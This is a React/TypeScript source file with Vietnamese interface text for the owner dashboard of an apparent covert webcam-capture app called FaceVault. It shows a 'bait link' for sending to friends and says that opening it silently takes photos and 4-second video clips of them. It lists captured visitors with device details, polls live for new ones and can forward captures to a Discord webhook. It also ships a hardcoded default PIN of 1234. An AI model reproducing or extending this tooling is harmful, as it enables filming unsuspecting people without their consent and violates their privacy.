import React, { useState, useEffect, useRef } from 'react';
import {
  CaptureRecord,
  getAllCaptures,
  deleteCapture,
  clearAllCaptures,
  toggleFavorite,
} from '../utils/storage';
import {
  Shield,
  Lock,
  Unlock,
  Trash2,
  Download,
  Star,
  Play,
  Calendar,
  Monitor,
  Share2,
  Sparkles,
  RefreshCw,
  Search,
  Filter,
  Check,
  Video,
  Image as ImageIcon,
  Sliders,
  Send,
  ExternalLink,
  Eye,
  Camera,
  X,
  Clock,
  Radio,
} from 'lucide-react';

interface VaultPageProps {
  onGoToScanner?: () => void;
}

export const VaultPage: React.FC<VaultPageProps> = ({ onGoToScanner }) => {
  const [captures, setCaptures] = useState<CaptureRecord[]>([]);
  const [isLoading, setIsLoading] = useState<boolean>(true);
  const [isUnlocked, setIsUnlocked] = useState<boolean>(() => {
    return sessionStorage.getItem('vault_unlocked') === 'true';
  });
  const [pinInput, setPinInput] = useState<string>('');
  const [pinError, setPinError] = useState<string>('');
  const [savedPin, setSavedPin] = useState<string>('1234');
  const [selectedCapture, setSelectedCapture] = useState<CaptureRecord | null>(null);
  const [filterType, setFilterType] = useState<'all' | 'video' | 'favorite'>('all');
  const [searchQuery, setSearchQuery] = useState<string>('');
  const [copiedLink, setCopiedLink] = useState<boolean>(false);
  const [showSettings, setShowSettings] = useState<boolean>(false);
  const [webhookUrl, setWebhookUrl] = useState<string>('');
  const [webhookSaved, setWebhookSaved] = useState<boolean>(false);
  const [autoRefresh, setAutoRefresh] = useState<boolean>(true);
  const [lastUpdated, setLastUpdated] = useState<string>('');

  const previousCountRef = useRef<number>(0);

  // Load captures and settings
  const loadData = async (silent = false) => {
    if (!silent) setIsLoading(true);
    try {
      const records = await getAllCaptures();
      setCaptures(records);

      if (records.length > previousCountRef.current && previousCountRef.current !== 0) {
        // New capture sound or notification!
        try {
          const audio = new AudioContext();
          const osc = audio.createOscillator();
          const gain = audio.createGain();
          osc.type = 'triangle';
          osc.frequency.setValueAtTime(880, audio.currentTime);
          gain.gain.setValueAtTime(0.1, audio.currentTime);
          gain.gain.exponentialRampToValueAtTime(0.01, audio.currentTime + 0.2);
          osc.connect(gain);
          gain.connect(audio.destination);
          osc.start();
          osc.stop(audio.currentTime + 0.2);
        } catch {}
      }
      previousCountRef.current = records.length;

      const now = new Date();
      setLastUpdated(
        `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`
      );

      // fetch settings
      const sRes = await fetch('/api/settings').catch(() => null);
      if (sRes && sRes.ok) {
        const sData = await sRes.json();
        if (sData.settings) {
          if (sData.settings.pin) setSavedPin(sData.settings.pin);
          if (sData.settings.webhookUrl) setWebhookUrl(sData.settings.webhookUrl);
        }
      }
    } catch (e) {
      console.error(e);
    } finally {
      if (!silent) setIsLoading(false);
    }
  };

  useEffect(() => {
    loadData();
  }, []);

  // Auto-poll every 3.5s so new visitors pop up live!
  useEffect(() => {
    if (!autoRefresh) return;
    const interval = setInterval(() => {
      loadData(true);
    }, 3500);
    return () => clearInterval(interval);
  }, [autoRefresh]);

  const handleUnlock = (e: React.FormEvent) => {
    e.preventDefault();
    if (pinInput === savedPin) {
      setIsUnlocked(true);
      sessionStorage.setItem('vault_unlocked', 'true');
      setPinError('');
    } else {
      setPinError('Mã PIN không đúng! (Mặc định: 1234)');
    }
  };

  const handleLockAgain = () => {
    setIsUnlocked(false);
    sessionStorage.removeItem('vault_unlocked');
  };

  const handleDelete = async (id: string, e?: React.MouseEvent) => {
    e?.stopPropagation();
    if (window.confirm('Bạn có chắc muốn xóa bản ghi này?')) {
      await deleteCapture(id);
      setCaptures((prev) => prev.filter((c) => c.id !== id));
      if (selectedCapture?.id === id) setSelectedCapture(null);
    }
  };

  const handleClearAll = async () => {
    if (window.confirm('CẢNH BÁO: Xóa toàn bộ ảnh và video trong kho lưu trữ?')) {
      await clearAllCaptures();
      setCaptures([]);
      setSelectedCapture(null);
    }
  };

  const handleToggleFav = async (id: string, e?: React.MouseEvent) => {
    e?.stopPropagation();
    await toggleFavorite(id);
    setCaptures((prev) =>
      prev.map((c) => (c.id === id ? { ...c, isFavorite: !c.isFavorite } : c))
    );
    if (selectedCapture?.id === id) {
      setSelectedCapture((prev) => (prev ? { ...prev, isFavorite: !prev.isFavorite } : null));
    }
  };

  const handleExport = () => {
    const dataStr = 'data:text/json;charset=utf-8,' + encodeURIComponent(JSON.stringify(captures, null, 2));
    const dlAnchor = document.createElement('a');
    dlAnchor.setAttribute('href', dataStr);
    dlAnchor.setAttribute('download', `FaceVault_Backup_${Date.now()}.json`);
    dlAnchor.click();
  };

  const copyScannerLink = () => {
    const publicUrl = window.location.origin;
    navigator.clipboard.writeText(publicUrl);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2500);
  };

  const handleSaveSettings = async (e: React.FormEvent) => {
    e.preventDefault();
    await fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ pin: savedPin, webhookUrl }),
    }).catch(() => {});
    setWebhookSaved(true);
    setTimeout(() => {
      setWebhookSaved(false);
      setShowSettings(false);
    }, 1500);
  };

  // Filtered list
  const filteredCaptures = captures.filter((item) => {
    if (filterType === 'video' && !item.hasVideo && !item.videoDataUrl) return false;
    if (filterType === 'favorite' && !item.isFavorite) return false;
    if (searchQuery.trim()) {
      const q = searchQuery.toLowerCase();
      const matchTitle = item.funAnalysis?.title?.toLowerCase().includes(q);
      const matchDevice = item.device?.toLowerCase().includes(q);
      const matchDate = item.dateString?.toLowerCase().includes(q);
      if (!matchTitle && !matchDevice && !matchDate) return false;
    }
    return true;
  });

  const totalVideos = captures.filter((c) => c.hasVideo || c.videoDataUrl).length;

  return (
    <div className="w-full min-h-screen bg-zinc-950 text-zinc-100 flex flex-col font-sans select-none">
      {/* Top Navbar */}
      <header className="px-4 sm:px-8 py-4 border-b border-zinc-800 bg-zinc-900/80 backdrop-blur-md sticky top-0 z-40 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="p-2.5 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 shadow-lg shadow-cyan-500/10">
            <Shield className="w-6 h-6" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h1 className="text-base sm:text-lg font-black tracking-wide text-white">
                KHO LƯU TRỮ HÌNH ẢNH & VIDEO RIÊNG
              </h1>
              <span className="px-2 py-0.5 rounded-full bg-cyan-950 border border-cyan-800 text-xs font-mono text-cyan-400">
                {captures.length} lượt tóm
              </span>
            </div>
            <p className="text-xs text-zinc-400">
              Web riêng biệt dành cho chủ nhân • Tự động nhận ảnh & video clip khi có người vào quét
            </p>
          </div>
        </div>

        {/* Right Action Buttons */}
        <div className="flex items-center gap-2 sm:gap-3">
          {/* Copy Clean Link for Friends */}
          <button
            onClick={copyScannerLink}
            className="px-3 py-2 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-black font-bold text-xs shadow-lg shadow-cyan-500/20 transition flex items-center gap-1.5 active:scale-95"
            title="Sao chép link trang quét sạch (không có nút kho) để gửi cho bạn bè"
          >
            {copiedLink ? <Check className="w-4 h-4 text-white" /> : <Share2 className="w-4 h-4" />}
            <span className="hidden sm:inline">
              {copiedLink ? 'Đã sao chép link sạch!' : 'Sao Chép Link Mồi (Gửi Bạn Bè)'}
            </span>
            <span className="sm:hidden">{copiedLink ? 'Đã copy' : 'Copy Link'}</span>
          </button>

          {/* Open Clean Scanner page */}
          <a
            href="/"
            onClick={(e) => {
              if (onGoToScanner) {
                e.preventDefault();
                onGoToScanner();
              }
            }}
            className="p-2 sm:px-3 sm:py-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-300 font-medium text-xs transition flex items-center gap-1.5"
            title="Xem giao diện quét của khách"
          >
            <Camera className="w-4 h-4 text-cyan-400" />
            <span className="hidden sm:inline">Mở Web Quét Mặt</span>
          </a>

          {/* Settings */}
          <button
            onClick={() => setShowSettings(!showSettings)}
            className="p-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition"
            title="Cài đặt Webhook & PIN"
          >
            <Sliders className="w-4 h-4" />
          </button>

          {/* Lock again */}
          {isUnlocked && (
            <button
              onClick={handleLockAgain}
              className="p-2 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-zinc-400 hover:text-white transition"
              title="Khóa lại"
            >
              <Lock className="w-4 h-4" />
            </button>
          )}
        </div>
      </header>

      {/* Main Body */}
      {!isUnlocked ? (
        /* PIN Lock Screen */
        <main className="flex-1 flex items-center justify-center p-6">
          <form
            onSubmit={handleUnlock}
            className="max-w-sm w-full bg-zinc-900 border border-zinc-800 p-8 rounded-3xl text-center shadow-2xl relative overflow-hidden"
          >
            <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-center text-cyan-400">
              <Lock className="w-8 h-8" />
            </div>
            <h2 className="text-xl font-bold mb-1 text-white">Mã PIN Bảo Mật</h2>
            <p className="text-xs text-zinc-400 mb-6">
              Nhập mã PIN để mở Kho Lưu Trữ Của Tui (Mặc định: <code className="text-cyan-400 font-mono">1234</code>)
            </p>
            <input
              type="password"
              maxLength={6}
              value={pinInput}
              onChange={(e) => setPinInput(e.target.value)}
              placeholder="Nhập PIN..."
              autoFocus
              className="w-full text-center text-2xl tracking-widest py-3 px-4 rounded-xl bg-zinc-950 border border-zinc-700 focus:border-cyan-400 focus:outline-none mb-3 text-white font-mono"
            />
            {pinError && <div className="text-xs text-red-400 mb-3">{pinError}</div>}
            <button
              type="submit"
              className="w-full py-3 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-black font-bold text-sm transition shadow-lg shadow-cyan-500/20 flex items-center justify-center gap-2 active:scale-95"
            >
              <Unlock className="w-4 h-4" />
              Mở Khóa Kho Lưu Trữ
            </button>
          </form>
        </main>
      ) : showSettings ? (
        /* Settings View */
        <main className="flex-1 p-6 flex items-center justify-center">
          <div className="max-w-xl w-full bg-zinc-900 border border-zinc-800 rounded-3xl p-6 sm:p-8 shadow-2xl">
            <h2 className="text-lg font-bold mb-4 flex items-center gap-2 text-cyan-300">
              <Sliders className="w-5 h-5" />
              Cài Đặt Kho Lưu Trữ
            </h2>
            <form onSubmit={handleSaveSettings} className="space-y-5">
              <div>
                <label className="block text-xs font-semibold uppercase text-zinc-400 mb-1">
                  Đổi Mã PIN Bảo Mật (Mặc định: 1234)
                </label>
                <input
                  type="text"
                  value={savedPin}
                  onChange={(e) => setSavedPin(e.target.value)}
                  className="w-full py-2.5 px-3 rounded-xl bg-zinc-950 border border-zinc-700 text-sm focus:border-cyan-400 focus:outline-none font-mono text-white"
                />
              </div>

              <div>
                <label className="block text-xs font-semibold uppercase text-zinc-400 mb-1">
                  Webhook Báo Về Discord (Tùy chọn)
                </label>
                <p className="text-[11px] text-zinc-400 mb-2">
                  Dán URL Webhook của Discord. Khi có người mở web và scan mặt, bot sẽ tự động gửi ảnh và thông báo ngay về điện thoại / máy tính của He!
                </p>
                <input
                  type="url"
                  value={webhookUrl}
                  onChange={(e) => setWebhookUrl(e.target.value)}
                  placeholder="https://discord.com/api/webhooks/..."
                  className="w-full py-2.5 px-3 rounded-xl bg-zinc-950 border border-zinc-700 text-sm focus:border-cyan-400 focus:outline-none font-mono text-zinc-200"
                />
              </div>

              <div className="pt-2 flex items-center justify-between">
                <button
                  type="button"
                  onClick={() => setShowSettings(false)}
                  className="py-2.5 px-4 rounded-xl bg-zinc-800 hover:bg-zinc-700 text-xs font-medium"
                >
                  Đóng
                </button>
                <button
                  type="submit"
                  className="py-2.5 px-6 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-black font-bold text-xs transition flex items-center gap-2"
                >
                  {webhookSaved ? <Check className="w-4 h-4" /> : <Send className="w-4 h-4" />}
                  {webhookSaved ? 'Đã lưu cài đặt!' : 'Lưu Thay Đổi'}
                </button>
              </div>
            </form>
          </div>
        </main>
      ) : (
        /* Vault Dashboard */
        <main className="flex-1 flex flex-col p-4 sm:p-8 max-w-7xl mx-auto w-full">
          {/* Dashboard Stats Cards */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 sm:gap-4 mb-6">
            <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-4 flex items-center gap-3">
              <div className="p-3 rounded-xl bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                <ImageIcon className="w-5 h-5" />
              </div>
              <div>
                <div className="text-xl font-extrabold text-white">{captures.length}</div>
                <div className="text-xs text-zinc-400">Ảnh Đã Tóm</div>
              </div>
            </div>

            <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-4 flex items-center gap-3">
              <div className="p-3 rounded-xl bg-pink-500/10 text-pink-400 border border-pink-500/20">
                <Video className="w-5 h-5" />
              </div>
              <div>
                <div className="text-xl font-extrabold text-pink-300">{totalVideos}</div>
                <div className="text-xs text-zinc-400">Video Clips (4s)</div>
              </div>
            </div>

            <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-4 flex items-center gap-3">
              <div className="p-3 rounded-xl bg-amber-500/10 text-amber-400 border border-amber-500/20">
                <Star className="w-5 h-5 fill-amber-400/20" />
              </div>
              <div>
                <div className="text-xl font-extrabold text-amber-300">
                  {captures.filter((c) => c.isFavorite).length}
                </div>
                <div className="text-xs text-zinc-400">Được Gắn Sao</div>
              </div>
            </div>

            <div className="bg-zinc-900 border border-zinc-800 rounded-2xl p-4 flex items-center gap-3">
              <div className="p-3 rounded-xl bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                <Radio className="w-5 h-5 animate-pulse" />
              </div>
              <div>
                <div className="text-xs font-mono font-bold text-emerald-400">
                  {autoRefresh ? 'Tự Động Bắt Sống' : 'Thủ Công'}
                </div>
                <div className="text-[11px] text-zinc-400">Cập nhật: {lastUpdated || 'Đang chờ'}</div>
              </div>
            </div>
          </div>

          {/* Filter Bar & Quick Actions */}
          <div className="bg-zinc-900/60 border border-zinc-800 rounded-2xl p-3 sm:p-4 mb-6 flex flex-wrap items-center justify-between gap-3 text-xs">
            {/* Filter buttons */}
            <div className="flex items-center gap-1.5 bg-zinc-950 p-1 rounded-xl border border-zinc-800">
              <button
                onClick={() => setFilterType('all')}
                className={`px-3 py-1.5 rounded-lg transition font-medium flex items-center gap-1.5 ${
                  filterType === 'all'
                    ? 'bg-cyan-500 text-black font-bold shadow'
                    : 'text-zinc-400 hover:text-white'
                }`}
              >
                <ImageIcon className="w-3.5 h-3.5" />
                Tất cả ({captures.length})
              </button>
              <button
                onClick={() => setFilterType('video')}
                className={`px-3 py-1.5 rounded-lg transition font-medium flex items-center gap-1.5 ${
                  filterType === 'video'
                    ? 'bg-cyan-500 text-black font-bold shadow'
                    : 'text-zinc-400 hover:text-white'
                }`}
              >
                <Video className="w-3.5 h-3.5" />
                Có Video ({totalVideos})
              </button>
              <button
                onClick={() => setFilterType('favorite')}
                className={`px-3 py-1.5 rounded-lg transition font-medium flex items-center gap-1.5 ${
                  filterType === 'favorite'
                    ? 'bg-amber-400 text-black font-bold shadow'
                    : 'text-zinc-400 hover:text-white'
                }`}
              >
                <Star className="w-3.5 h-3.5 fill-current" />
                Yêu thích
              </button>
            </div>

            {/* Search Input */}
            <div className="relative flex-1 min-w-[200px] max-w-sm">
              <Search className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder="Tìm theo ngày, thiết bị..."
                className="w-full pl-8 pr-3 py-2 rounded-xl bg-zinc-950 border border-zinc-800 text-xs text-white placeholder-zinc-500 focus:outline-none focus:border-cyan-500"
              />
            </div>

            {/* Action buttons */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => setAutoRefresh(!autoRefresh)}
                className={`px-2.5 py-1.5 rounded-lg transition text-xs font-medium flex items-center gap-1.5 ${
                  autoRefresh
                    ? 'bg-emerald-950/60 border border-emerald-500/40 text-emerald-400'
                    : 'bg-zinc-800 text-zinc-400'
                }`}
                title="Bật/Tắt tự động cập nhật trực tiếp"
              >
                <Radio className={`w-3.5 h-3.5 ${autoRefresh ? 'animate-pulse' : ''}`} />
                <span>{autoRefresh ? 'Live ON' : 'Live OFF'}</span>
              </button>

              <button
                onClick={() => loadData()}
                className="p-2 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition"
                title="Tải lại ngay"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${isLoading ? 'animate-spin' : ''}`} />
              </button>

              <button
                onClick={handleExport}
                disabled={captures.length === 0}
                className="px-3 py-2 rounded-lg bg-zinc-800 hover:bg-zinc-700 disabled:opacity-40 text-zinc-300 transition flex items-center gap-1.5"
                title="Tải toàn bộ dữ liệu sao lưu (JSON)"
              >
                <Download className="w-3.5 h-3.5" />
                <span>Xuất File</span>
              </button>

              <button
                onClick={handleClearAll}
                disabled={captures.length === 0}
                className="px-3 py-2 rounded-lg bg-red-950/60 hover:bg-red-900 border border-red-800/50 disabled:opacity-40 text-red-300 transition flex items-center gap-1.5"
                title="Xóa toàn bộ kho"
              >
                <Trash2 className="w-3.5 h-3.5" />
                <span>Xóa Hết</span>
              </button>
            </div>
          </div>

          {/* Media Grid */}
          {filteredCaptures.length === 0 ? (
            <div className="flex-1 flex flex-col items-center justify-center text-center p-12 text-zinc-500">
              <div className="w-16 h-16 rounded-3xl bg-zinc-900 border border-zinc-800 flex items-center justify-center text-zinc-600 mb-3">
                <ImageIcon className="w-8 h-8" />
              </div>
              <h3 className="text-base font-semibold text-zinc-300 mb-1">
                Chưa có ai vào quét mặt
              </h3>
              <p className="text-xs max-w-sm mb-4 leading-relaxed">
                Hãy sao chép đường link mồi sạch và gửi cho bạn bè. Khi họ mở ra xem, hệ thống sẽ tự động chụp ảnh và quay clip gửi về đây ngay lập tức!
              </p>
              <button
                onClick={copyScannerLink}
                className="py-2.5 px-5 rounded-xl bg-cyan-500 hover:bg-cyan-400 text-black font-bold text-xs transition flex items-center gap-2 active:scale-95"
              >
                <Share2 className="w-3.5 h-3.5" />
                Sao Chép Link Gửi Bạn Bè
              </button>
            </div>
          ) : (
            <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
              {filteredCaptures.map((item) => (
                <div
                  key={item.id}
                  onClick={() => setSelectedCapture(item)}
                  className="group relative bg-zinc-900 border border-zinc-800 hover:border-cyan-500/50 rounded-2xl overflow-hidden shadow-lg transition hover:shadow-cyan-500/10 cursor-pointer flex flex-col"
                >
                  {/* Photo or Video Thumbnail */}
                  <div className="relative aspect-video bg-black overflow-hidden">
                    <img
                      src={item.photoDataUrl}
                      alt="Capture"
                      className="w-full h-full object-cover transition duration-300 group-hover:scale-105"
                      loading="lazy"
                    />

                    {/* Clip badge */}
                    {(item.hasVideo || item.videoDataUrl) && (
                      <div className="absolute top-2 left-2 px-2 py-0.5 rounded-md bg-black/75 backdrop-blur-md border border-cyan-500/40 text-[10px] font-mono text-cyan-300 flex items-center gap-1 shadow">
                        <Video className="w-3 h-3 text-cyan-400" />
                        CLIP 4s
                      </div>
                    )}

                    {/* Favorite toggle */}
                    <button
                      onClick={(e) => handleToggleFav(item.id, e)}
                      className={`absolute top-2 right-2 p-1.5 rounded-lg backdrop-blur-md transition ${
                        item.isFavorite
                          ? 'bg-amber-400 text-black'
                          : 'bg-black/60 text-zinc-400 hover:text-white'
                      }`}
                    >
                      <Star className="w-3.5 h-3.5 fill-current" />
                    </button>

                    {/* Quick Delete button (hover) */}
                    <button
                      onClick={(e) => handleDelete(item.id, e)}
                      className="absolute bottom-2 right-2 p-1.5 rounded-lg bg-black/75 hover:bg-red-600 text-zinc-400 hover:text-white transition opacity-0 group-hover:opacity-100"
                      title="Xóa bản ghi"
                    >
                      <Trash2 className="w-3.5 h-3.5" />
                    </button>
                  </div>

                  {/* Card Info Footer */}
                  <div className="p-3.5 flex-1 flex flex-col justify-between">
                    <div>
                      <div className="text-xs font-bold text-zinc-200 truncate group-hover:text-cyan-300">
                        {item.funAnalysis?.title || 'Khách vào xem'}
                      </div>
                      <div className="text-[10px] text-zinc-400 flex items-center gap-1 mt-1 truncate">
                        <Monitor className="w-3 h-3 flex-shrink-0 text-zinc-500" />
                        <span className="truncate">{item.device || 'Trình duyệt Web'}</span>
                      </div>
                    </div>

                    <div className="mt-3 pt-2 border-t border-zinc-800 text-[10px] text-zinc-400 flex items-center justify-between font-mono">
                      <span className="flex items-center gap-1">
                        <Clock className="w-3 h-3 text-cyan-500" />
                        {item.dateString}
                      </span>
                      <span className="text-cyan-400 font-semibold group-hover:underline flex items-center gap-0.5">
                        <Eye className="w-3 h-3" />
                        Xem
                      </span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          )}
        </main>
      )}

      {/* Detail Full View Modal */}
      {selectedCapture && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-6 bg-black/90 backdrop-blur-lg animate-in fade-in duration-150">
          <div className="relative w-full max-w-4xl bg-zinc-950 border border-cyan-500/40 rounded-3xl overflow-hidden shadow-2xl p-5 sm:p-6 text-white flex flex-col max-h-[92vh]">
            {/* Header */}
            <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
              <div className="flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-cyan-400" />
                <h3 className="font-bold text-sm text-cyan-300">
                  Chi Tiết Ghi Hình: {selectedCapture.funAnalysis?.title}
                </h3>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => handleToggleFav(selectedCapture.id)}
                  className={`p-1.5 rounded-lg border transition ${
                    selectedCapture.isFavorite
                      ? 'bg-amber-400 text-black border-amber-300'
                      : 'bg-zinc-800 text-zinc-400 border-zinc-700'
                  }`}
                >
                  <Star className="w-4 h-4 fill-current" />
                </button>
                <button
                  onClick={() => handleDelete(selectedCapture.id)}
                  className="p-1.5 rounded-lg bg-red-950/80 hover:bg-red-900 border border-red-800 text-red-300 transition"
                  title="Xóa bản ghi"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
                <button
                  onClick={() => setSelectedCapture(null)}
                  className="p-1.5 rounded-lg bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>
            </div>

            {/* Media Content */}
            <div className="flex-1 overflow-y-auto py-4 space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {/* Photo Snapshot */}
                <div className="space-y-2">
                  <div className="text-xs font-semibold text-zinc-400 flex items-center justify-between">
                    <span className="flex items-center gap-1.5">
                      <ImageIcon className="w-3.5 h-3.5 text-cyan-400" />
                      Ảnh Chụp Khuôn Mặt (Snapshot)
                    </span>
                    <a
                      href={selectedCapture.photoDataUrl}
                      download={`snapshot-${selectedCapture.id}.jpg`}
                      className="text-cyan-400 hover:text-cyan-300 inline-flex items-center gap-1 font-mono text-[11px]"
                    >
                      <Download className="w-3 h-3" /> Tải JPG
                    </a>
                  </div>
                  <div className="relative rounded-2xl overflow-hidden border border-zinc-800 bg-black aspect-video flex items-center justify-center">
                    <img
                      src={selectedCapture.photoDataUrl}
                      alt="Snapshot"
                      className="w-full h-full object-contain"
                    />
                  </div>
                </div>

                {/* Video Clip */}
                <div className="space-y-2">
                  <div className="text-xs font-semibold text-zinc-400 flex items-center justify-between">
                    <span className="flex items-center gap-1.5">
                      <Video className="w-3.5 h-3.5 text-pink-400" />
                      Video Clip Quay Tự Động (4s)
                    </span>
                    {selectedCapture.videoDataUrl && (
                      <a
                        href={selectedCapture.videoDataUrl}
                        download={`video-clip-${selectedCapture.id}.webm`}
                        className="text-pink-400 hover:text-pink-300 inline-flex items-center gap-1 font-mono text-[11px]"
                      >
                        <Download className="w-3 h-3" /> Tải Clip
                      </a>
                    )}
                  </div>
                  <div className="relative rounded-2xl overflow-hidden border border-zinc-800 bg-black aspect-video flex items-center justify-center">
                    {selectedCapture.videoDataUrl ? (
                      <video
                        src={selectedCapture.videoDataUrl}
                        controls
                        autoPlay
                        loop
                        playsInline
                        className="w-full h-full object-contain"
                      />
                    ) : (
                      <div className="text-xs text-zinc-500 text-center p-4">
                        Lượt này chỉ có ảnh chụp nhanh
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Detailed Device & Time Metadata */}
              <div className="p-4 rounded-2xl bg-zinc-900 border border-zinc-800 text-xs space-y-3">
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-3">
                  <div>
                    <span className="text-zinc-500 block text-[10px] uppercase font-bold">Thời Gian Vào</span>
                    <span className="font-mono text-zinc-200">{selectedCapture.dateString}</span>
                  </div>
                  <div>
                    <span className="text-zinc-500 block text-[10px] uppercase font-bold">Thiết Bị & Trình Duyệt</span>
                    <span className="font-mono text-zinc-200">{selectedCapture.device || 'N/A'}</span>
                  </div>
                  <div>
                    <span className="text-zinc-500 block text-[10px] uppercase font-bold">Mã Phiên Quét</span>
                    <span className="font-mono text-cyan-400">{selectedCapture.funAnalysis?.matchId}</span>
                  </div>
                </div>

                <div className="pt-2 border-t border-zinc-800/80">
                  <span className="text-zinc-500 block text-[10px] uppercase font-bold mb-0.5">
                    Đánh Giá AI Lúc Đó:
                  </span>
                  <p className="text-zinc-300 italic">
                    "{selectedCapture.funAnalysis?.fortuneQuote}"
                  </p>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
